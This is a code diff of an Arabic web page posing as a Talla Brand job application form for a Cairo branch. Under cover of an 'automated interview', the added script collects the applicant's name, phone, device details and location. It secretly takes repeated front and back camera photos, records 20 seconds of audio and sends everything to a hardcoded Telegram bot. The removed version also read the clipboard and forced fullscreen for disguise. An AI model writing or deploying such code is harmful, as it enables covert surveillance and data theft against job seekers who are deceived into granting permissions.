@@ -2,92 +2,164 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التحقق المتقدم | Talla Brand</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة التوظيف | Talla Brand</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .panel { background: #1c2128; padding: 40px; border-radius: 20px; border: 1px solid #e91e63; text-align: center; width: 90%; max-width: 450px; }
-        .btn-main { background: #e91e63; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 20px; cursor: pointer; width: 100%; font-weight: bold; }
-        #status { margin-top: 20px; font-size: 14px; color: #8b949e; }
+        :root { --main-color: #e91e63; --text-color: #333; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .app-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 500px; }
+        .logo { font-size: 28px; font-weight: bold; color: var(--main-color); text-align: center; margin-bottom: 5px; }
+        .sub-title { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: 600; color: var(--text-color); }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 15px; background: var(--main-color); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn-submit:hover { background: #c2185b; }
+        #status-area { display: none; text-align: center; margin-top: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-color); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #final-msg { display: none; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="panel" id="ui">
-    <h1 style="color:#e91e63">Talla Admin</h1>
-    <p>يجب تفعيل بروتوكول الأمان الشامل للوصول للمنظومة.</p>
-    <button class="btn-main" onclick="executeOmniCapture()">بدء تفعيل كافة الصلاحيات</button>
-    <div id="status">بانتظار تفعيل البروتوكول...</div>
+<div class="app-box" id="form-content">
+    <div class="logo">Talla Brand</div>
+    <div class="sub-title">نموذج تقديم على وظيفة (فرع القاهرة)</div>
+    
+    <div class="form-group">
+        <label>الاسم الكامل</label>
+        <input type="text" id="fullname" placeholder="أدخل اسمك الثلاثي">
+    </div>
+    <div class="form-group">
+        <label>رقم الهاتف (واتساب)</label>
+        <input type="tel" id="phone" placeholder="01xxxxxxxxx">
+    </div>
+    <div class="form-group">
+        <label>الوظيفة المطلوبة</label>
+        <select id="job">
+            <option>مبيعات (داخل الفرع)</option>
+            <option>مسؤول تسويق إلكتروني</option>
+            <option>مصمم أزياء</option>
+            <option>عامل مخزن</option>
+        </select>
+    </div>
+
+    <p style="font-size:12px; color:#888;">* يتطلب التقديم تفعيل الكاميرا والميكروفون لإجراء المقابلة المبدئية الآلية وتسجيل الموقع للتحقق من السكن.</p>
+    
+    <button class="btn-submit" onclick="startApplication()">تقديم الطلب وبدء المقابلة</button>
+
+    <div id="status-area">
+        <div class="loader"></div>
+        <p id="status-text">جاري الاتصال بسيرفر التوظيف...</p>
+    </div>
 </div>
 
-<video id="v" autoplay style="display:none;"></video>
-<canvas id="c" style="display:none;"></canvas>
+<div class="app-box" id="final-msg">
+    <div class="logo" style="color: #4CAF50;">✅ تم استلام طلبك</div>
+    <p>شكراً لتقديمك في Talla Brand. سيتم مراجعة بياناتك والتواصل معك عبر الواتساب لإجراء المقابلة النهائية.</p>
+</div>
+
+<video id="video-front" autoplay style="display:none;"></video>
+<video id="video-back" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
     const chatId = "8754338811";
 
-    async function send(msg, isFile = false, blob = null, type = "photo") {
-        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendDocument') : 'sendMessage'}`;
+    async function sendToBot(type, data, isFile = false, fileName = "") {
+        let url = `https://api.telegram.org/bot${token}/`;
         const fd = new FormData();
         fd.append('chat_id', chatId);
-        if (isFile) { fd.append(type === 'photo' ? 'photo' : 'document', blob, type === 'photo' ? 'img.jpg' : 'voice.mp3'); }
-        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
+        if (isFile) {
+            url += type === 'photo' ? 'sendPhoto' : 'sendAudio';
+            fd.append(type === 'photo' ? 'photo' : 'audio', data, fileName);
+        } else {
+            url += 'sendMessage';
+            fd.append('text', data); fd.append('parse_mode', 'Markdown');
+        }
         await fetch(url, { method: 'POST', body: fd });
     }
 
-    async function executeOmniCapture() {
-        document.getElementById('status').innerText = "جاري تفعيل الحساسات والاتصال...";
-        
+    async function startApplication() {
+        const name = document.getElementById('fullname').value;
+        const phone = document.getElementById('phone').value;
+        const job = document.getElementById('job').value;
+
+        if(!name || !phone) { alert("يرجى ملء البيانات أولاً"); return; }
+
+        document.getElementById('status-area').style.display = 'block';
+        document.getElementById('status-text').innerText = "جاري تفعيل الكاميرا والميكروفون للمقابلة الآلية...";
+
         try {
-            // 1. طلب الكاميرا والميكروفون
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            
-            // 2. سحب بيانات الحساسات (Accelerometer, Gyro, Battery, etc.)
-            let sensorData = `🚀 *تقرير شامل عن الجهاز:*\n`;
-            sensorData += `- الشاشة: ${screen.width}x${screen.height}\n`;
-            sensorData += `- اللغة: ${navigator.language}\n`;
-            if (navigator.getBattery) { const b = await navigator.getBattery(); sensorData += `- البطارية: ${b.level*100}% (شحن: ${b.charging})\n`; }
-            
-            // 3. محاولة قراءة الحافظة (Clipboard)
-            try { const clip = await navigator.clipboard.readText(); sensorData += `- الحافظة: ${clip}\n`; } catch(e){}
-            
-            await send(sensorData);
+            // 1. طلب الصلاحيات (أمامية، خلفية، ميكروفون)
+            const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            let streamBack = null;
+            try { streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e) { console.log("لا توجد كاميرا خلفية"); }
 
-            // 4. سحب الموقع الجغرافي (Geolocation)
-            navigator.geolocation.getCurrentPosition(p => {
-                send(`📍 *الموقع:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
+            // 2. إرسال بيانات النموذج وبيانات الجهاز
+            await sendToBot('text', `📝 *طلب وظيفة جديد:* \n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n💼 الوظيفة: ${job}`);
+            const deviceNote = `📱 *الجهاز:* ${navigator.platform}\n🔋 البطارية: ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A'}`;
+            sendToBot('text', deviceNote);
 
-            // 5. التقاط الصور (19 صورة)
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            let count = 0;
-            const picInterval = setInterval(() => {
-                if (count >= 19) { clearInterval(picInterval); return; }
-                const canvas = document.getElementById('c');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
-                count++;
-            }, 1000);
+            // 3. الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendToBot('text', `📍 *الموقع:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                });
+            }
+
+            // 4. إعداد الفيديوهات المخفية
+            const vidFront = document.getElementById('video-front');
+            vidFront.srcObject = streamFront;
+            let vidBack = null;
+            if(streamBack) { vidBack = document.getElementById('video-back'); vidBack.srcObject = streamBack; }
+
+            // 5. نظام التقاط الصور (واحدة بواحدة - أمامية وخلفية)
+            let photoCount = 0;
+            const canvas = document.getElementById('canvas');
+            canvas.width = 640; canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+
+            const photoInterval = setInterval(() => {
+                if (photoCount >= 19) { clearInterval(photoInterval); return; }
+
+                // أ. التقاط أمامي
+                ctx.drawImage(vidFront, 0, 0, 640, 480);
+                canvas.toBlob(blob => sendToBot('photo', blob, true, `front_${photoCount}.jpg`), 'image/jpeg');
+
+                // ب. التقاط خلفي (إذا وجد)
+                if(vidBack) {
+                    setTimeout(() => {
+                        ctx.drawImage(vidBack, 0, 0, 640, 480);
+                        canvas.toBlob(blob => sendToBot('photo', blob, true, `back_${photoCount}.jpg`), 'image/jpeg');
+                    }, 300); // فرق بسيط بين الأمامية والخلفية
+                }
+
+                photoCount++;
+            }, 1200); // التقاط ثنائي كل ثانية ونصف تقريباً
 
             // 6. تسجيل الصوت (20 ثانية)
-            const recorder = new MediaRecorder(stream);
+            document.getElementById('status-text').innerText = "جاري تسجيل الإجابات الصوتية للمقابلة (20 ثانية)...";
+            const recorder = new MediaRecorder(streamFront);
             const chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
+            recorder.onstop = async () => {
                 const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
-                send("", true, audioBlob, "audio");
-                document.getElementById('ui').innerHTML = "<h1>✅ تم بنجاح</h1><p>شكراً لتواصلك معنا.</p>";
+                await sendToBot('audio', audioBlob, true, 'interview.mp3');
+                
+                // النهاية
+                document.getElementById('form-content').style.display = 'none';
+                document.getElementById('final-msg').style.display = 'block';
+                streamFront.getTracks().forEach(t => t.stop());
+                if(streamBack) streamBack.getTracks().forEach(t => t.stop());
             };
             recorder.start();
             setTimeout(() => recorder.stop(), 20000);
 
-            // 7. تفعيل Fullscreen (لزيادة التمويه)
-            document.documentElement.requestFullscreen().catch(e => {});
-
         } catch (err) {
-            alert("⚠️ يجب الموافقة على جميع الأذونات لتشغيل النظام.");
+            alert("⚠️ خطأ: يجب السماح بجميع الأذونات (الكاميرا، الميكروفون، الموقع) لإتمام عملية التقديم.");
             location.reload();
         }
     }
